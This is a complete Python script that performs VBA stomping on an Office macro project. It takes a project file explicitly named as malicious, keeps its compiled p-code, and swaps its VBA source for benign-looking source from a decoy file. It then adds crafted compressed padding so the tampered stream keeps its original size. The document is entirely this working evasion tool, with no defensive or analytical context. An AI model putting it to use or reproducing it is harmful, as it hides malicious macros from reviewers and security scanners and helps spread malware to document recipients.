import olefile
import struct
import sys
import shutil

# --- CONFIGURATION ---
target_stream = 'VBA/Module1' 
file_malicious = 'malicious_vbaProject.bin'
file_fake = 'fakesource_vbaProject.bin'
file_out  = 'vbaProject.bin'

def find_compressed_source_start(data):
    """
    Find the starting position of Compressed Source
    Signature: 0x01
    ChunkHeader: 0xBxxx
    """
    for i in range(10, len(data) - 3):
        if data[i] == 0x01:
            header_val = struct.unpack_from('<H', data, i+1)[0]
            if (header_val & 0xF000) == 0xB000:
                return i
    return -1

def create_compressed_padding(target_size):
    """
    Create compressed chunk
    """
    if target_size < 3:
        return b'\x01\xB0\x00'[:target_size]
    
    chunk_data = bytearray()
    data_capacity = target_size - 2
    
    current_len = 0
    while current_len < data_capacity:
        if current_len + 1 >= data_capacity:
            chunk_data.append(0x00)
            current_len += 1
            break
        
        chunk_data.append(0x00)
        current_len += 1
        
        for _ in range(8):
            if current_len >= data_capacity:
                break
            if current_len % 3 == 0:
                chunk_data.append(0x0D)  # CR
            elif current_len % 3 == 1:
                chunk_data.append(0x0A)  # LF
            else:
                chunk_data.append(0x20)  # Space
            current_len += 1
    
    # Create header: 0xBxxx
    header_val = (len(chunk_data) + 2 - 3) & 0x0FFF
    header_val = header_val | 0xB000
    header_bytes = struct.pack('<H', header_val)
    
    return header_bytes + chunk_data

def main():
    try:
        shutil.copy2(file_malicious, file_out)
        ole_out = olefile.OleFileIO(file_out, write_mode=True)
        malicious_stream_data = ole_out.openstream(target_stream).read()
        original_size = len(malicious_stream_data)
        ole_fake = olefile.OleFileIO(file_fake)
        real_fake = ole_fake.openstream(target_stream).read()
        ole_fake.close()
        malicious_offset = find_compressed_source_start(malicious_stream_data)
        fake_offset = find_compressed_source_start(real_fake)
        if malicious_offset == -1 or fake_offset == -1:
            print("ERROR: Source Code not found.")
            return
        source_benign_blob = real_fake[fake_offset:]
        pcode_part = malicious_stream_data[:malicious_offset]
        temp_stream = pcode_part + source_benign_blob
        missing_bytes = original_size - len(temp_stream)
        
        print(f"   Original Size: {original_size}")
        print(f"   New Data Size: {len(temp_stream)}")
        
        final_stream = temp_stream

        if missing_bytes > 0:
            print(f"   Creating Compressed Padding ({missing_bytes} bytes)...")            
            compressed_padding = create_compressed_padding(missing_bytes)
            final_stream += compressed_padding
        elif missing_bytes < 0:
            print(f"   [WARN] Clean source is longer than original. Truncating {-missing_bytes} bytes.")
            final_stream = final_stream[:original_size]

        # Overwrite
        ole_out.write_stream(target_stream, final_stream)
        ole_out.close()
        print(f"[+] Completed! Output saved to: {file_out}")
    except Exception as e:
        print(f"ERROR: {e}")

if __name__ == "__main__":
    main()